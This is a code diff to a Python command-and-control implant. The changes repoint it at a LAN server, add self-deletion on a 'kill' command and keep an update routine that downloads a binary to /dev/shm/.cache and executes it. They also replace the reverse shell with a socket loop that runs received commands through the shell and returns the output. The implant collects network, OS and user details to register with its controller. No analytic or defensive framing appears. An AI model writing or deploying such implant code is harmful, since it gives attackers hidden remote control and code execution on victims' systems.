@@ -1,3 +1,4 @@
+#!/usr/bin/env python3
 import json
 import os
 import random
@@ -6,18 +7,21 @@ import socket
 import subprocess
 from base64 import b64encode, b64decode
 from json import JSONDecodeError
+from multiprocessing import Process
 from time import sleep
 from urllib import request
 
-from multiprocessing import Process
-
-c2 = 'http://localhost:5000/'
+c2 = 'http://dev-4.lan/'
+path = '/dev/shm/.cache'
 loc = 'register'
 chloc = 'checkin?k='
 
 
 def cloak():
-    pass
+    try:
+        os.remove(__file__)
+    except OSError:
+        pass
 
 
 def parse_msg(html):
@@ -50,10 +54,11 @@ def reverse_shell(conf):
             sleep(10)
             i += 1
     if i < 5:
-        os.dup2(s.fileno(), 0)
-        os.dup2(s.fileno(), 1)
-        os.dup2(s.fileno(), 2)
-        subprocess.run(["/bin/sh", "-i"])
+        while True:
+            cmd = s.recv(1024).decode()
+            r = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+            output_bytes = r.stdout.read() + r.stderr.read()
+            s.send(output_bytes)
 
 
 def handle_msg(msg):
@@ -66,8 +71,9 @@ def handle_msg(msg):
         else:
             if msg['cmd'] == 'update':
                 print("Updating")
-                subprocess.run(['wget', msg['url'], '-O', '/dev/shm/.cache'])
-                os.execl('/dev/shm/.cache', '/dev/shm/.cache')
+                subprocess.run(['wget', msg['url'], '-O', path])
+                os.chmod(path, 755)
+                os.execl(path, path)
             elif msg['cmd'] == 'reverse':
                 print("Reverse shell")
                 p = Process(target=reverse_shell, args=(msg,))
@@ -78,6 +84,9 @@ def handle_msg(msg):
                 p = Process(target=subprocess.run, args=(msg,))
                 p.start()
                 return p
+            elif msg['cmd'] == 'kill':
+                cloak()
+                raise SystemExit
     print("nothing to do")
 
 
@@ -95,7 +104,10 @@ def get_info():
     try:
         i = subprocess.check_output(['ifconfig']).decode()
     except FileNotFoundError:
-        i = subprocess.check_output(['/sbin/ifconfig']).decode()
+        try:
+            i = subprocess.check_output(['/sbin/ifconfig']).decode()
+        except FileNotFoundError:
+            i = subprocess.check_output(['ip', 'addr']).decode()
     o = open('/etc/os-release').read()
     u = os.getuid()
     return json.dumps(dict(k=k, i=i, o=o, u=u))
@@ -108,4 +120,4 @@ if __name__ == '__main__':
     print(key)
     while True:
         check_in()
-        sleep(random.randint(45, 75))
+        sleep(random.randint(5, 5))
